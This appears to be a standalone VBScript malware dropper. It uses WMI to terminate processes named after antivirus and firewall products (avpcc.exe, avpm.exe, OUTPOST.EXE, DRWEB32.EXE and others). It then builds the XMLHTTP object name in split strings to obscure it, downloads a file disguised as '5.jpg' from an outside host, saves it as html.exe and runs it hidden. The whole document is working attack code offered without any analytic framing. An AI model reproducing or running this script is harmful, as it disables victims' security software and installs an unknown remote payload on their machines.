   strComputer = "."
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colProcessList = objWMIService.ExecQuery _
   ("SELECT * FROM Win32_Process WHERE Name = 'avpcc.exe'")
   For Each objProcess in colProcessList
   objProcess.Terminate()
   Next
   strComputer = "."
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colProcessList = objWMIService.ExecQuery _
   ("SELECT * FROM Win32_Process WHERE Name = 'avpm.exe'")
   For Each objProcess in colProcessList
   objProcess.Terminate()
   Next
   strComputer = "."
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colProcessList = objWMIService.ExecQuery _
   ("SELECT * FROM Win32_Process WHERE Name = 'OUTPOST.EXE'")
   For Each objProcess in colProcessList
   objProcess.Terminate()
   Next
   strComputer = "."
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colProcessList = objWMIService.ExecQuery _
   ("SELECT * FROM Win32_Process WHERE Name = 'DRWEB32W.EXE'")
   For Each objProcess in colProcessList
   objProcess.Terminate()
   Next
   strComputer = "."
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colProcessList = objWMIService.ExecQuery _
   ("SELECT * FROM Win32_Process WHERE Name = 'DRWEB32.EXE'")
   For Each objProcess in colProcessList
   objProcess.Terminate()
   Next
   Dim BD
   Dim xml
   WScript.Sleep(3000)
   fgfrf = "MLHTT"
   blabla = "Microsoft.X"
   Set xml = CreateObject(blabla+fgfrf+"P")
   xml.Open "GET", "http://www.ddosboard.com/5.jpg", False
   xml.Send
   BD = xml.ResponseBody
   Const adTypeBinary = 1
   Const adSaveCreateOverWrite = 2
   Dim BinaryStream
   Set BinaryStream = CreateObject("ADODB.Stream")
   BinaryStream.Type = adTypeBinary
   C=C=C
   BinaryStream.Open
   BinaryStream.Write BD
   BinaryStream.SaveToFile "html.exe", adSaveCreateOverWrite
   Dim WshShell
   Set WshShell = CreateObject("WScript.Shell")
   WshShell.Run "html.exe", 0, false
